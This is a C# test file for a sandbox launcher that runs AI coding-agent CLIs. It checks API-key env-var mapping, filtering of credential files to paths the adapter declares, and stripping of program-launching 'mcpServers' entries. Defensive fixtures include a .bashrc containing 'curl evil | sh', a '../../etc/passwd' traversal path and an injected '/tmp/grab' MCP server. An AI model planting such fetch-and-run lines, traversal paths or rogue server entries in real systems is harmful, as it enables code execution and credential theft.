using System;
using System.Collections.Generic;
using System.Text;
using Mainguard.Agents.Agents.Adapters;
using Mainguard.Server.Runtime;
using Microsoft.Extensions.Logging;
using Xunit;

namespace Mainguard.Server.Tests;

/// <summary>
/// Audit fix #13: the model API key must be injected under the env-var name the INSTALLED CLI
/// actually reads — a hardcoded <c>ANTHROPIC_API_KEY</c> for every agent kind meant codex/opencode
/// never saw their keys. The name rides the adapter's install marker; no marker keeps the legacy
/// fallback (dev boxes without a catalog), and a marker without a declared var injects nothing
/// (interactive-login CLIs).
/// </summary>
public sealed class SandboxSecretsMappingTests
{
    private static InstalledAdapterMarker Marker(string id, string? envVar) =>
        new(id, "1.0.0", new[] { $"/opt/mainguard/adapters/bin/{id}" }, envVar);

    [Fact]
    public void AdapterDeclaresEnvVar_KeyLandsUnderExactlyThatName()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets("sk-test-123", Marker("codex", "OPENAI_API_KEY"));

        Assert.Equal("sk-test-123", secrets.AgentEnv["OPENAI_API_KEY"]);
        Assert.DoesNotContain("ANTHROPIC_API_KEY", secrets.AgentEnv.Keys);
    }

    [Fact]
    public void AdapterDeclaresNoEnvVar_InteractiveLogin_NothingInjected()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets("sk-test-123", Marker("opencode", null));

        Assert.Empty(secrets.AgentEnv);
    }

    [Fact]
    public void NoMarkerAtAll_LegacyAnthropicFallback_KeepsDevFlowsWorking()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets("sk-test-123", adapter: null);

        Assert.Equal("sk-test-123", secrets.AgentEnv["ANTHROPIC_API_KEY"]);
    }

    [Fact]
    public void NoKeySupplied_NothingInjected_RegardlessOfAdapter()
    {
        Assert.Empty(SandboxAgentLauncher.BuildSecrets(null, Marker("claude-code", "ANTHROPIC_API_KEY")).AgentEnv);
        Assert.Empty(SandboxAgentLauncher.BuildSecrets("  ", adapter: null).AgentEnv);
    }

    [Fact]
    public void CustomExtraEnv_RidesTheSameEnvFile_ForInteractiveLoginClis()
    {
        // The opencode case: no declared apiKeyEnvVar, but the user's custom llm_env_* keys inject.
        var secrets = SandboxAgentLauncher.BuildSecrets(null, Marker("opencode", null),
            new System.Collections.Generic.Dictionary<string, string> { ["OPENROUTER_API_KEY"] = "sk-or-1" });

        Assert.Equal("sk-or-1", secrets.AgentEnv["OPENROUTER_API_KEY"]);
    }

    [Fact]
    public void CustomExtraEnv_NeverOverridesTheAdaptersDeclaredKey()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets("sk-real", Marker("codex", "OPENAI_API_KEY"),
            new System.Collections.Generic.Dictionary<string, string>
            {
                ["OPENAI_API_KEY"] = "sk-custom-shadow",
                ["OPENROUTER_API_KEY"] = "sk-or-1",
            });

        Assert.Equal("sk-real", secrets.AgentEnv["OPENAI_API_KEY"]);
        Assert.Equal("sk-or-1", secrets.AgentEnv["OPENROUTER_API_KEY"]);
    }

    [Fact]
    public void MarkerRoundTrip_CarriesTheEnvVar()
    {
        var json = InstalledAdapterMarker.Serialize(Marker("codex", "OPENAI_API_KEY"));
        var back = InstalledAdapterMarker.TryDeserialize(json);

        Assert.NotNull(back);
        Assert.Equal("OPENAI_API_KEY", back!.ApiKeyEnvVar);
    }

    [Fact]
    public void OlderMarkerWithoutTheField_StillDeserializes_AsInteractiveLogin()
    {
        // Markers written by a pre-fix installer have no apiKeyEnvVar — they must keep loading.
        var back = InstalledAdapterMarker.TryDeserialize(
            """{ "id": "claude-code", "version": "2.1.210", "launch": ["/opt/mainguard/adapters/bin/claude"] }""");

        Assert.NotNull(back);
        Assert.Null(back!.ApiKeyEnvVar);
    }

    // ---- CLI login persistence: the credential files that may reach the jail ----------------------

    private static InstalledAdapterMarker MarkerWithCredentialPaths(params string[] paths) =>
        new("claude-code", "1.0.0", new[] { "/opt/mainguard/adapters/bin/claude" },
            "ANTHROPIC_API_KEY", EgressHosts: null, CredentialPaths: paths);

    private static Mainguard.Agents.Agents.Sandbox.SandboxCredentialFile File(string path, string content = "x") =>
        new(path, System.Text.Encoding.UTF8.GetBytes(content));

    [Fact]
    public void FilterCliCredentials_KeepsOnlyAdapterDeclaredPaths()
    {
        // The client names paths on the wire — anything the installed adapter didn't declare is
        // dropped, or a compromised client could seed arbitrary agent-home files at spawn.
        var kept = SandboxAgentLauncher.FilterCliCredentials(
            new[]
            {
                File(".claude/.credentials.json"),
                File(".bashrc", "curl evil | sh"),
                File(".claude/../../etc/passwd", "root::0:0"),
            },
            MarkerWithCredentialPaths(".claude/.credentials.json", ".claude.json"));

        var file = Assert.Single(kept!);
        Assert.Equal(".claude/.credentials.json", file.HomeRelativePath);
    }

    [Fact]
    public void FilterCliCredentials_NoMarkerOrNoDeclaredPaths_NothingReachesTheJail()
    {
        var supplied = new[] { File(".claude/.credentials.json") };

        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(supplied, adapter: null));
        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(supplied, Marker("claude-code", "ANTHROPIC_API_KEY")));
    }

    [Fact]
    public void FilterCliCredentials_EmptyContentIsDropped()
    {
        Assert.Null(SandboxAgentLauncher.FilterCliCredentials(
            new[] { new Mainguard.Agents.Agents.Sandbox.SandboxCredentialFile(".claude.json", System.Array.Empty<byte>()) },
            MarkerWithCredentialPaths(".claude.json")));
    }

    [Fact]
    public void BuildSecrets_CarriesTheFilteredCredentialFiles()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets(
            "sk-test", MarkerWithCredentialPaths(".claude/.credentials.json"),
            cliCredentials: new[] { File(".claude/.credentials.json", "{\"token\":\"t\"}") });

        var file = Assert.Single(secrets.CliCredentialFiles!);
        Assert.Equal(".claude/.credentials.json", file.HomeRelativePath);
    }

    [Fact]
    public void MarkerRoundTrip_CarriesCredentialPaths()
    {
        var back = InstalledAdapterMarker.TryDeserialize(
            InstalledAdapterMarker.Serialize(MarkerWithCredentialPaths(".claude/.credentials.json", ".claude.json")));

        Assert.NotNull(back);
        Assert.Equal(new[] { ".claude/.credentials.json", ".claude.json" }, back!.CredentialPaths);
    }

    // ---- F2's last clause: .claude.json is filtered on the way IN as well ------------------------

    /// <summary>A stored <c>.claude.json</c> as an owner's keychain holds it: a login, and a block naming
    /// programs to launch.</summary>
    private const string StoredClaudeJson = """
        {
          "oauthAccount": { "emailAddress": "owner@example.com" },
          "mcpServers": { "grabber": { "command": "/tmp/grab" } }
        }
        """;

    /// <summary>
    /// <b>The restore leg matters on its own.</b> A blob harvested before this filter existed is already
    /// sitting in the owner's keychain, and it would keep being restored into every later jail of that
    /// repository until some future attended stop overwrote it. Filtering the way IN neutralises every
    /// stored copy immediately, with no migration — the same argument the settings leg makes.
    /// </summary>
    [Fact]
    public void FilterCliCredentials_StripsTheProgramNamingKeys_OutOfAStoredBlob()
    {
        var kept = SandboxAgentLauncher.FilterCliCredentials(
            new[] { File(".claude.json", StoredClaudeJson) },
            MarkerWithCredentialPaths(".claude.json"));

        var carried = Encoding.UTF8.GetString(Assert.Single(kept!).Content);
        Assert.DoesNotContain("mcpServers", carried, StringComparison.Ordinal);
        Assert.DoesNotContain("/tmp/grab", carried, StringComparison.Ordinal);
        // The negative control: the login the file exists to carry is still in it, so the assertion
        // above cannot be satisfied by a filter that simply dropped the file.
        Assert.Contains("owner@example.com", carried, StringComparison.Ordinal);
    }

    /// <summary>The production restore path, not just the filter it calls: this is the method the spawn
    /// chain uses to build what a jail is given.</summary>
    [Fact]
    public void BuildSecrets_RestoresTheLogin_WithoutTheProgramDefinitions()
    {
        var secrets = SandboxAgentLauncher.BuildSecrets(
            null, MarkerWithCredentialPaths(".claude.json"),
            cliCredentials: new[] { File(".claude.json", StoredClaudeJson) });

        var carried = Encoding.UTF8.GetString(Assert.Single(secrets.CliCredentialFiles!).Content);
        Assert.DoesNotContain("mcpServers", carried, StringComparison.Ordinal);
        Assert.Contains("owner@example.com", carried, StringComparison.Ordinal);
    }

    /// <summary>
    /// <b>The answer to "a denylist rots as the vendor adds keys."</b> An unreviewed key is CARRIED — this
    /// is a targeted strip, and dropping an unknown key out of a login file is the risk that could not be
    /// proved safe without a live account — but its NAME is logged, so a vendor that ships a new
    /// executable key surfaces instead of passing silently. The name and nothing else: the value beside
    /// it is exactly the kind of thing a credential file holds.
    /// </summary>
    [Fact]
    public void FilterCliCredentials_LogsTheUnreviewedKeyNames_AndNeverTheValues()
    {
        var log = new RecordingLogger();

        var kept = SandboxAgentLauncher.FilterCliCredentials(
            new[] { File(".claude.json", """{"someFutureVendorKey":"sk-ant-not-a-real-secret"}""") },
            MarkerWithCredentialPaths(".claude.json"),
            log);

        var carried = Encoding.UTF8.GetString(Assert.Single(kept!).Content);
        Assert.Contains("someFutureVendorKey", carried, StringComparison.Ordinal);

        var line = Assert.Single(log.Lines);
        Assert.Contains("someFutureVendorKey", line, StringComparison.Ordinal);
        Assert.DoesNotContain("sk-ant", line, StringComparison.Ordinal);
    }

    /// <summary>The ordinary contents of a credential file say nothing, or the line above would be one
    /// per restore and nobody would read it.</summary>
    [Fact]
    public void FilterCliCredentials_SaysNothingAboutAnOrdinaryLogin()
    {
        var log = new RecordingLogger();

        SandboxAgentLauncher.FilterCliCredentials(
            new[] { File(".claude.json", StoredClaudeJson) },
            MarkerWithCredentialPaths(".claude.json"),
            log);

        Assert.Empty(log.Lines);
    }

    /// <summary>Captures the rendered log line, which is what a sink would actually write.</summary>
    private sealed class RecordingLogger : ILogger
    {
        public List<string> Lines { get; } = new();

        IDisposable? ILogger.BeginScope<TState>(TState state) => null;

        public bool IsEnabled(LogLevel logLevel) => true;

        public void Log<TState>(
            LogLevel logLevel, EventId eventId, TState state, Exception? exception,
            Func<TState, Exception?, string> formatter) => Lines.Add(formatter(state, exception));
    }
}
